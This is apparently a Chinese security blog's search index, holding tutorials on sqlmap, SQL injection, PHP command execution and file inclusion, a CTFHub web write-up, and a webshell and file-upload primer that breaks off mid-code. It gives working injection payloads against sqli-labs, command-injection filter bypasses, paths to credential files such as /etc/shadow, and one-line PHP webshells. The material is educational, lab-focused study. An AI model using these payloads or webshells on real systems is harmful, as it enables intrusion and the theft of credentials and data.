[{"title":"sqlmap","url":"/post/e5da2ca1.html","content":"\n\nsqlmap简介sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL进行SQL注入。\n用于数据库注入\n猜解是否能注入\n\n\npython sqlmap.py -u “url”\n\n\n猜解库\n\n\npython sqlmap.py -u “url” –dbs\n\n\n猜解表\n\n\npython sqlmap.py -u “url” –tables\n\n\n根据猜解的表进行猜解表的字段(假如通过2得到了admin这个表)\n\n\npython sqlmap.py -u “url” –columns -T admin\n\n\n根据字段猜解内容(假如通过3得到字段为username和password)\n\n\npython sqlmap.py -u “url” –dump -T admin -C “username,password”\n\n用于cookie注入\ncookie注入，猜解表\n\n\npython sqlmap.py -u “url” –cookie “cookie” –table –level 2\n\n\n猜解字段，(通过1的表猜解字段，假如表为admin)\n\n\npython sqlmap.py -u “url” –cookie “cookie” –columns -T admin –level 2\n\n\n猜解内容\n\n\npython sqlmap.py -u “url” –cookie “cookie” –dump -T admin -C “username,password” –level 2\n\npost登录框注入\n浏览器打开目标地址\nburp抓包，拦截请求\n点击提交，burp会拦截post请求\n复制post请求头为post.txt，并放到sqlmap目录下\n运行sqlmap\n\nstep1：sqlmap -r [&quot;请求头文本&quot;]  //测试是否存在注入step2：sqlmap -r [&quot;请求头文本&quot;] --current-db //查询当前数据库step3：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] --tables //查询当前数据库的所有表step4：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] --columns //查询指定库指定表的所有字段step5：sqlmap -r [&quot;请求头文本&quot;] -D [&quot;数据库名&quot;] -T [&quot;表名&quot;] -C [&quot;字段名&quot;] --dump //打印出指定库指定表指定字段的所有字段内容\n\n常见参数使用\n设置目标URL：\n\n\n参数：-u    每次只能扫描一个url格式：sqlmap -u “url”\n参数：-m    从文本中获取多个目标扫描，但是每次只能有一个url格式：sqlmap -m 1.txt、\n参数：-r    从文件中加载HTTP请求，这样的话，就不需要再去设定coolie，POST数据等值…..格式：sqlmap -r 1.txt\n\n\n设置回显等级：\n\n\n参数：-v0、只显示python错误以及严重的信息。1、同时显示基本信息和警告信息。（默认等级）2、同时显示debug信息。3、同时显示注入的payload。4、同时显示HTTP请求。5、同时显示HTTP响应头。6、同时显示HTTP响应页。\n\n\n设定探测等级：\n\n\n参数：–level默认为1level&gt;=2的时候就会测试HTTP Cookielevel&gt;=3的时候就会测试HTTP User-Agent/Referer头level=5的时候会测试HTTP Host\n\n参数介绍\noptions类：\n\n\nsqlmap –version    查看sqlmap版本信息.\n-h    查看功能参数(常用的)\n-hh　查看所有的参数 (如果有中文包 就最好了)\n-v　显示更详细的信息 一共7级, 从0-6.默认为1, 数值越大,信息显示越详细.\n\n\nTarget(指定目标):\n\n\n-d　直接连接数据库侦听端口,类似于把自己当一个客户端来连接.\n-u    指定url扫描,但url必须存在查询参数. 例: xxx.php?id=1 \n-l    指定logfile文件进行扫描,可以结合burp 把访问的记录保存成一个log文件, sqlmap可以直接加载burp保存到log文件进行扫描\n-x    以xml的形式提交一个站点地图给sqlmap(表示不理解..)\n-m    如果有多个url地址,可以把多个url保存成一个文本文件 -m可以加载文本文件逐个扫描\n-r    把http的请求头,body保存成一个文件 统一提交给sqlmap,sqlmap会读取内容进行拼接请求体\n-g    利用谷歌搜索引擎搭配正则来过滤你想要的\n-c    加载配置文件,配置文件可以指定扫描目标,扫描方式,扫描内容等等.加载了配置文件sqlmap就会根据文件内容进行特定的扫描\n\n\nRequest类参数\n\n\n–data    提交的时候要携带的参数（get，post通用，最简单的post请求方式）\n–users     获取数据库用户\n–dbs    获取所有数据库\n–cookie    设置cookie头\n–user-agent    指定user-agent（防止对方服务器侦测到）\n–random-agent    随机agent\n–host    指定host头\n–level    安全级别 (1-5, &gt;=3,检测anent,&gt;=5,检测host头)\n–referer    指定referer头(level &gt;=3才检测)\n–headers    指定额外的headers请求头(多个必须使用换\\n,首字母必须大写)\n–method　指定请求方式, 默认为get,get请求不成功尝试post　　　\n–proxy　指定代理 \n–proxy-cred    指定代理的账号密码(代理需要账号密码的前提下)\n–delay　每次请求的延迟时间,单位秒,默认无延迟.\n–timeout　请求超时时间,默认30秒.\n–retries　连接超时重试次数 ,默认3次\n\n","categories":["网络安全"],"tags":["工具"]},{"title":"sql注入","url":"/post/530fceb2.html","content":"\n\n什么是SQL注入\nSQL 注入就是指 web应用程序对用户输入的数据合法性没有过滤或者是判断，前端传入的参数是攻击者可以控制，并且参数带入数据库的查询，攻击者可以通过构造恶意的 sql语句来实现 对数据库的任意操作。\n\nSQL注入攻击思路\n\n判断是否存在注入\n判断注入类型\n猜解语句中的字段数\n判断回显位置\n爆数据库名\n爆表名\n爆字段名\n查找内容\n\n\n判断是否存在SQL注入\n最为经典的单引号判断法：在参数后面加上单引号,比如: http://xxx/abc.php?id=1&#39; 如果页面返回错误，则存在SQL注入。原因是无论字符型还是整型都会因为单引号个数不匹配而报错。\n\n判断SQL注入类型类型分为两种：数字型和字符型\n\n数字型判断：可以使用经典的 and 1=1 和 and 1=2 来判断：\n\n\nurl中输入？id=1 and 1=1 页面依旧正常运行，继续下一步url中输入？id=1 and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。\n\n\n字符型判断：可以使用 and ‘1’=’1 和 and ‘1’=’2来判断：\n\n\nurl中输入1’ and ‘1’ = ‘1,页面运行正常，继续进行下一步。url中继续输入1’ and ‘1’ = ‘2,页面运行错误，则说明此 Sql 注入为字符型注入。\n\n常见的注入方式\n联合注入\n布尔盲注\n时间盲注\n宽字节注入\n报错注入\n堆叠注入\n二次注入\n……\n\n联合注入注入一般流程：\n\n\n判断注入点\n判断字段数\n判断回显位置\n爆破库名\n爆破表名\n爆破字段名\n爆破字段值\n\n\n以sql-libs/Less-1为例(1)判断注入点\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=1 --+\tpayload： http://localhost/www.sql.com/Less-1/?id=1&#x27; and 1=2 --+\t\t根据页面回显不同，判断id参数存在sql注入(2)判断字段数 order by\tpayload：http://localhost/www.sql.com/Less-1/?id=1&#x27; order by x --+\t发现x=3时有回显，x=4时无回显，判断出存在三列(3)判断回显位置 union select\t需将参数的数据值设为不存在\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,2,3 --+ \t判断出回显位置为2，3(4)爆破库名 在回显位置替换参数即可\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,database(),3 --+ (5)爆破表名 \tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 --+ (6)爆破字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3 --+ (7)爆破字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=-1&#x27; union select 1,(select group_concat(username,0x3a,password) from users),3 --+\n\n报错注入应用场景：查询不回显内容，会打印错误信息\n\n常用函数：floor(),updatexml(),extractvalue()\n\n以updatexml()为例(1)爆表 修改 limit 0,1 参数 依次爆出所有表名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --+(2)爆字段名\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段名(3)爆字段值\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值(4)爆对应的密码\tpayload：http://localhost/sqli-labs/Less-1/?id=1&#x27; and updatexml(1,concat(0x7e,(select password from users where username = &#x27;Dumb&#x27; limit 0,1),0x7e),1) --+\t通过修改limit参数，获取所有字段值\n\n布尔盲注应用场景：\n\n代码存在sql注入漏洞，然而页面不会显数据，也不会显错误信息。只返回”right” 与wrong 这里我们可以通过构造语句，来判断数据库信息的正确性，在通过页面的“真”和“假”来识别我们的判断是否正确，这就是布尔盲注。\n\n常用函数：\n\nleft()       left(database(),1)&gt;’s’    database()显示数据库名称，left(a,b)从左侧截取a的前b位。regexp           select user() regexp ‘^r’  正则表达式用法 user()结果为root,regexp为匹配root的正则表达式like         select users() like ‘’ro%’   与regexp类似，使用like进行匹配substr函数   ascii() 函数    ascii(substr(select database()),1,1)=98 从1位置开始截取数据库名字的1个长度，ascii()将字符转化为ascii值。ord()   mid()     mid(a,b,c)ord(mid((select user()),1,1))=114从位置b开始，截取a字符串的c位，ord()函数通ascii()，将字符转为ascii值。\n\n时间盲注时间盲注是什么？\n\n通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如：在SQL语句中使用sleep()函数\n看加载页面的时间来判断注入点\n适用场景：没有回显，甚至连注入语句是否执行都无从得知\n\n常用函数：\n\nsleep() – 返回0 命令中断返回1substr(a,b,c) – 从b为止开始截取字符串a的c长度mid() – 与substr完全一致count() – 计算总数ascii() – 返回第一个字符的ASII码ord() – 与ascii完全一致length() – 返回字符串的长度left() – 从左往右截取字符串right() –从右往左截取字符串if(condition,true,false)：condition为条件，条件为真返回true，条件为假返回false\n\n注入一般流程：\n\n先用length()获取数据库长度用substr() and sleep() 来确定每一个字符，从而确定数据库\n\n堆叠注入\n原理介绍： 在SQL中，分号（;）是用来表示一条sql语句的结束。\n\n\n联合注入也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union或者unionall执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 \n\n\n局限性： 使用该注入，需要知道数据库的一些信息，例如表名，列名等。并不是每种环境都可以使用。oracle数据库不行，mysql、mssql‘postgresql可以。  \n\n\n应用实例：已经爆破出管理员密码，但是是加密存储，且无法解密。可以使用堆叠注入，在该表中注入 \n\n举个栗子;select if(length(database())&gt;1,sleep(3),1);select if(substr(database(),1,1)=&#x27;r&#x27;,sleep(3),1)\n\n二次注入\n原理 分为两步：第一步：插入恶意数据第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行转义，在写入数据库时还是保留用户输入的数据，但是该数据中包含恶意内容。 \n第二步：引用恶意数据在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。 \n\n\n例如：输入参数1’     参数经过转义函数变为1&#39;    参数进入数据库存储还原为1’寻找另一处引用这个数据的操作将1’从数据库中取出       取出后直接给变量并且带入SQL   SQL注入触发 实战   sql-lib 24 1.在创建用户界面 创建 admin’#  123 账号 2.登录  admin ‘#  123 账号 修改admin’#密码为  123456 3.发现 admin 密码变为123456\n\n\n实战   sql-lib 241.在创建用户界面 创建 admin’#  123 账号2.登录  admin ‘#  123 账号 修改admin’#密码为  1234563.发现 admin 密码变为123456\n\nSQL注入绕过注入符号绕过\n常见的注释符号有\n\n-- 注释内容# 注释内容/*注释内容*/;\n\n大小写绕过举个例子select * from users where id = -1 union SelEcT 1,2,3\n\n内联注释绕过\n内联注释就是把一些特有的仅在MYSQL上的语句放在 /*!...*/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。\n\n举个例子select * from users where id = -1 union /*!select*/ 1,2,3;\n\n双写关键字绕过\n将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。\n\n十六进制绕过举个例子test1等价于0x7465737431select * from users where username = 0x7465737431;\n\n空格过滤绕过/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格\n\n过滤or and xor not 绕过and = &amp;&amp;or = ||xor = | # 异或not = !\n\n过滤等号=绕过\n不加通配符的like执行的效果和=一致，所以可以用来绕过。利用大小于号、!配合使用进行绕过\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"RCE(远程代码执行漏洞)","url":"/post/de7b7d00.html","content":"\n\n形成原因\n应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数的参数，并且开发人员对这个参数没有严格的过滤时就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。\n\n可能存在命令执行漏洞的函数（PHP）\n利用系统函数实现命令执行的函数\n\n\neval()assert()preg_replace()call_user_func()\n\n\n直接执行系统命令的代码函数\n\n\nsystem()exec()shell_exec()&amp;(``)passthru()pcntl_exec()popen()proc_open()\n\n命令拼接符号\nWindows的系统命令拼接符\n\n\n\n\n拼接符\n示例\n拼接符的详解\n\n\n\n&amp;\nA&amp;B\n无论A是false还是true，B都执行，即互不影响\n\n\n&amp;&amp;\nA&amp;&amp;B\n具有短路效果，A是false，B就不执行，有短路效果\n\n\n|\nA|B\n表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行\n\n\n||\nA||B\n表示A命令语句执行失败，然后才执行B命令语句\n\n\n\nLinux的系统命令拼接符\n\n\n&amp;    使命令在后台运行;    进行多条命令的无关联执行，每一条执行结果互不影响&amp;&amp;    与Windows一样，左边成功才执行右边||    与Windows一样，前面执行失败才执行后面()    执行多个命令时，需要用命令分隔符分号隔开每个命令，并使用**()**把所有命令组合起来\n\nphp伪协议php支持的伪协议\n\nfile://    访问本地文件http://    访问HTTP(s)网址ftp://    访问FTP(s) URLsphp://    访问各个输入/输出流（I/O streams）zlib://    压缩流data://    数据（RFC 2397）glob://    查找匹配的文件路径模式phar://    PHP 归档ssh2://    Secure Shell 2rar://    RARogg://    音频流expect://    处理交互式的流\n\nphp://filter\n获取指定文件源码。当他与包含函数结合时，php://filter流会被当作php文件执行。\n\n协议参数\n\n\n\n名称\n描述\n\n\n\nresource=&lt;要过滤的数据流&gt;\n这个参数是必须的。它指定了你要筛选过滤的数据流。\n\n\nread=&lt;读链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（`\n\n\nwrite=&lt;写链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（`\n\n\n&lt;；两个链的筛选列表&gt;\n任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。\n\n\n常用：\nphp://filter/read=convert.base64-encode/resource=index.phpphp://filter/resource=index.phpconvert.base64-encode\t过滤器\n\ndata://\n数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。\n\n&lt;?php// 打印 &quot;I love PHP&quot;echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );?&gt;\n\nfile://\n用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)比如：?file=file:///etc/passsword\n\nphp://\n在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用php://作用为访问输入输出流\n\nphp://input\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n\n例如：?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt;注意：当enctype=&quot;multipart/form-data&quot;的时候php://input是无效的遇到file_get_contents()要想到用php://input绕过\nzip://\nzip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n例如：zip://[压缩包绝对路径]#[压缩包内文件]\n\nzip://中只能传入绝对路径。要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23只需要是zip的压缩包即可，后缀名可以任意更改。相同的类型的还有zlib://和bzip2://\n\n例如：?file=zip://D:\\zip.jpg%23phpinfo.txt\nPHP伪协议总结 \n各种绕过\ncat被过滤时\n\nmore     #一页一页的显示档案内容less     #与 more 类似head     #查看头几行tac      #从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail     #查看尾几行nl       #显示的时候，顺便输出行号od       #以二进制的方式读取档案内容sort     #可以查看uniq     #可以查看//vi       #一种编辑器，这个也可以查看//vim      #一种编辑器，这个也可以查看//file -f  #报错出具体内容//sh /flag 2&gt;%261  #报错出文件内容#使用转义符号ca\\t /fl\\agcat fl&#x27;&#x27;ag#拼接法a=fl;b=ag;cat$IFS$a$b#使用空变量$*和$@，$x,$&#123;x&#125;绕过ca$*t flag || ca$@t flag || ca$5t flag ca$&#123;5&#125;t flagfind    #列出当前目录下的文件以及子目录所有文件\n\n\n过滤空格\n\ncat&lt;flag  #重定向符cat$&#123;IFS&#125;flag || cat$IFS$9flag #全局变量#$IFS在linux下表示分隔符，但是如果单纯的cat$IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果#然而如果加一个&#123;&#125;就固定了变量名，同理在后面加个$可以起到截断的作用，#为什么要用$9呢，因为$9是当前系统shell进程的第九个参数的持有者，它始终为空字符串\n\n\n过滤目录分隔符\n\n#采用多管道命令绕过127.0.0.1||cd flag_is_here;cat flag_262431433226364.php%0a      #换行符%0d      #回车符号用?&gt;代替 ;#在php中可以用?&gt;来代替最后的一个; ，因为php遇到定界符关闭标签会自动在末尾加上一个分号\n\n其他绕过：命令执行(RCE)面对各种过滤，骚姿势绕过总结 \n文件包含\n以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()\n\n区别：\n\nrequire()：找不到被包含的文件会产生致命错误，并停止脚本运行\ninclude()：找不到被包含的文件只会产生警告，脚本继续执行\nrequire_once()：与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含\ninclude_once()：与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含\n\n\n\n本地文件包含漏洞\n一些常见的敏感文件路径\n\nWindows系统:\n\nC:\\boot.ini //查看系统版本\n\nC:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件\n\nC:\\windows\\repair\\sam //存储Windows系统初次安装的密码\n\nC:\\ProgramFiles\\mysql\\my.ini //Mysql配置\n\nC:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码\n\nC:\\windows\\php.ini //php配置信息\n\n\n\nLinux/Unix系统:\n\n/etc/password //账户信息\n\n/etc/shadow //账户密码信息\n\n/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件\n\n/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置\n\n/usr/local/app/php5/lib/php.ini //PHP相关配置\n\n/etc/httpd/conf/httpd.conf //Apache配置文件\n\n/etc/my.conf //mysql配置文件\n\n\n\n\n\n\n包含Apache日志文件\n有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。\n\n\n在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log\n当我们正常访问一个网页时，如http://127.0.0.1/phpinfo.php，access日志会进行记录\n如果我们访问一个不存在的资源，也一样会进行记录，例如访问127.0.0.1&lt;?php phpinfo();?&gt;，网页会显示403\n但查看日志会发现被成功记录但被编码了\n我们再次进行访问，并使用burp抓包，发现被编码\n我们将报文修改回去，再进行发送即可\n此时再查看access日志，正确写入php代码\n再通过本地文件包含漏洞访问，即可执行\n\n包含SESSION文件\n可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。\n\n利用条件：\n\n找到Session内的可控变量\nSession文件可读写，并且知道存储路径\n\n\nphp的session文件的保存路径可以在phpinfo的session.save_path看到\n\nsession常见存储路径:\n\n/var/lib/php/sess_PHPSESSID\n\n/var/lib/php/sess_PHPSESSID\n\n/tmp/sess_PHPSESSID\n\n/tmp/sessions/sess_PHPSESSID\n\nsession文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。\n\n\n\n\n包含临时文件\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n\n远程文件包含\n如果PHP的配置选项allow_url_include、allow_url_fopen状态为ON的话，则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含\n如下，有一段代码：\n\n&lt;?php\t$path=$_GET[&#x27;path&#x27;];\tinclude($path . &#x27;/phpinfo.php&#x27;);?&gt;\n\n\n访问本地site目录下的phpinfo.php文件:path=site访问成功\n我们在远端Web服务器/site/目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。\n但是代码会给我们输入的路径后面加上/phpinfo.php后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断\n还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数\n\n","categories":["网络安全"],"tags":["web安全"]},{"title":"CTFHUB-WEB","url":"/post/7e6bea45.html","content":"\n\nRCEeval执行打开环境发现一段php代码：\n&lt;?phpif (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;    eval($_REQUEST[&quot;cmd&quot;]);&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;\n\n发现参数为cmd\npayload：?cmd=phpinfo();有回显，说明可以利用系统命令函数\npayload：?cmd=system(&quot;ls /&quot;);有回显，并且看到有关于flag的文件，读取它\npayload：?cmd=system(&quot;ls / | cat /flag_9712&quot;);得到flag\n文件包含打开环境发现一段php代码：\n&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i have a &lt;a href=&quot;shell.txt&quot;&gt;shell&lt;/a&gt;, how to use it ?\n\n介绍一下陌生函数：\n\nstrpos(x,y)    查看y是否在x里\ninclude    将文件里的代码当作原来文件的代码执行\n\n点击shell得到一串php代码：\n&lt;?php eval($_REQUEST[&#x27;ctfhub&#x27;]);?&gt;\n\n\n\n根据代码得出：需要用GET传参方式传参，参数为file\npayload：?file=shell.txt点击shell得到php代码：&lt;?php eval($_REQUEST[&#39;ctfhub&#39;]);?&gt;\npayload：以post方式传参：ctfhub=system(&quot;ls&quot;)根据回显发现没有有关flag的文件，那就读取上级目录看看\npayload：ctfhub=system(&quot;ls /&quot;)根据回显发现flag\npayload：ctfhub=system(&quot;cat /flag&quot;)得到flag\nphp://input打开环境发现php代码：\n&lt;?phpif (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;\n\n根据代码得出：需要以GET方式传入一个名为file参数的数据，点击phpinfo()发现，php://input可以使用\npayload：?file=php://input根据php://input规则，需要POST传入数据\npayload：&lt;?php system(&quot;ls&quot;);?&gt;根据回显发现没有flag，查找上级目录\npayload：&lt;?php system(&quot;ls /&quot;);?&gt;发现flag，查看\npayload：&lt;?php system(&quot;cat /flag_4801&quot;);?&gt;得到flag\n读取源代码打开环境得到php代码：\n&lt;?phperror_reporting(E_ALL);if (isset($_GET[&#x27;file&#x27;])) &#123;    if ( substr($_GET[&quot;file&quot;], 0, 6) === &quot;php://&quot; ) &#123;        include($_GET[&quot;file&quot;]);    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag? &lt;br&gt;flag in &lt;code&gt;/flag&lt;/code&gt;\n\n根据提示使用php://input发现不管用，用一下新的伪协议吧——php://filter\npayload：?file=php://filter/resource=/flagflag一下子就出来了呢\n远程包含打开环境得到代码：\n&lt;?phperror_reporting(0);if (isset($_GET[&#x27;file&#x27;])) &#123;    if (!strpos($_GET[&quot;file&quot;], &quot;flag&quot;)) &#123;        include $_GET[&quot;file&quot;];    &#125; else &#123;        echo &quot;Hacker!!!&quot;;    &#125;&#125; else &#123;    highlight_file(__FILE__);&#125;?&gt;&lt;hr&gt;i don&#x27;t have shell, how to get flag?&lt;br&gt;&lt;a href=&quot;phpinfo.php&quot;&gt;phpinfo&lt;/a&gt;\n\n用一下php://input吧，一下子就得到了flag呢\npayload：&lt;?php system(&quot;cat /flag&quot;);?&gt;\n命令注入根据回显得出这是一个ping IP的题目\nping一下baidu.com得到回显\npayload：baidu.com | ls得到回显并发现可疑.php文件，打开发现打不开该文件，试一下base64吧\npayload：baidu.com | cat 31327443624755.php | base64 再解码得到flag\n过滤cat直接上payload\npayload：baidu.com | ls得到flag文件，但是cat被过滤了，换个吧\npayload：baidu.com | more flag_34911944417894.php | base64  得到加密后的flag，解码得到flag\n过滤空格直接上payload\npayload：baidu.com | ls发现没有东西，空格被过滤\npayload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;ls得到flag文件，查看该文件\npayload：baidu.com$&#123;IFS&#125;|$&#123;IFS&#125;cat$&#123;IFS&#125;flag_31123320624556.php$&#123;IFS&#125;|$&#123;IFS&#125;base64解密得到flag\n过滤目录分隔符payload：baidu.com | ls得到flag目录\npayload：baidu.com;cd flag_is_here;ls得到flag文件，查看文件\npayload：baidu.com;cd flag_is_here;cat flag_4088165719730.php|base64解码得到flag\n过滤运算符过滤了运算符，但是**;**漏掉了\npayload：baidu.com;ls查看flag文件\nbase64 *.php &lt;=&gt;*,php|base64\npayload：baidu.com;base64 flag_80902931728195.php\n综合过滤练习看完代码傻眼了，啥都被过滤了，哎~~~\n看看过滤笔记再来试试看可以用%0a(换行符)，但是需要在url上使用\npayload：baidu.com%0als得到flag目录，继续搞\npayload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0als得到flag文件\npayload：baidu.com%0acd$&#123;IFS&#125;fl&#39;&#39;ag_is_here%0abase64$&#123;IFS&#125;fl&#39;&#39;ag_248952873310635.php解码得到flag\n","categories":["网络安全"],"tags":["wp"]},{"title":"文件上传","url":"/post/592e5fba.html","content":"\n\nWebShell与WebShell管理工具什么叫做WebShell\nWebShell，简称网页后门。运行在Web应用之上的远程控制程序 \nwebshell其实就是一张网页，由PHP、JSP、ASP、ASP.NET等web语言开发，但并不具备常见网页的功能，例如登陆、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能\n\n常见的WebShell有哪些\n大马、小马、各种马等\n拥有完整功能的webshell，我们一般称为大马\n功能简易的webshell称为小马\n除此之外还有一句话木马、不死马、脱库马等等，是对webshell功能或者特性的简称\n\nWebShell有什么作用呢大马有什么作用呢\n\n上传大马后，可以通过大马来获取目标主机的控制权限、对内网进行扫描、获取内部系统的信息、盗取数据库等一系列操作\n\n一句话木马解读\n&lt;?php @eval($_POST[x]); ?&gt;\n\n\n$_POST[x]: 获取POST请求参数中x的值。例如POST请求中传递x=phpinfo();，那么$_POST[x]就等同于phpinfo();\neval()将字符串当作PHP代码去执行。例如eval(&#39;phpinfo();&#39;)，其中phpinfo();会被当做PHP代码去执行。\n\n&lt;?php @eval($_POST[x]); ?&gt;   实际上的传递过程是这样的\t\t\t↓\t\t\t↓\t\t\t\t\t\t↓&lt;?php @eval(&#x27;phpinfo();&#x27;); ?&gt; 实际的语句是这样的 \t\t\t\n\n\n我们通过该webshell，传递任意PHP代码，让其去执行，从而达到任意代码执行。\n错误控制运算符，当将 @放置在一个PHP表达式之前，该表达式可能产生的任何错误信息都被 忽略掉。\n\n文件上传什么是文件上传漏洞\n\n文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。\n\n客户端JavaScript检测\n如果上传非法文件，返回结果很快，或者F12打开开发者模式，上传非法文件，发现没有网络请求，但是被拦截了，很有可能就是客户端进行了JS校验检测。\n\n&lt;script type=&quot;text/javascript&quot;&gt;    function checkFile() &#123;        var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;        if (file == null || file == &quot;&quot;) &#123;            alert(&quot;请选择要上传的文件!&quot;);            return false;        &#125;        //定义允许上传的文件类型        var allow_ext = &quot;.jpg|.png|.gif&quot;;        //提取上传文件的类型        var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));        //判断上传文件类型是否允许上传        if (allow_ext.indexOf(ext_name) == -1) &#123;            var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;            alert(errMsg);            return false;        &#125;    &#125;&lt;/script&gt;\n\n绕过思路：1.直接本地禁用JS，不让其做检测 2.抓包，修改文件后缀名类型，绕过检测限制\n服务器后端检测文件类型检测\n此类检测防护主要是从content-type进行检测，检验请求中content-type是否符合可接受的上传类型(如”image/gif”,”image/png”,”image/jpeg”) \n\nif (isset($_POST[&#x27;submit&#x27;])) &#123;if (file_exists(UPLOAD_PATH)) &#123;        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;            $temp_file = 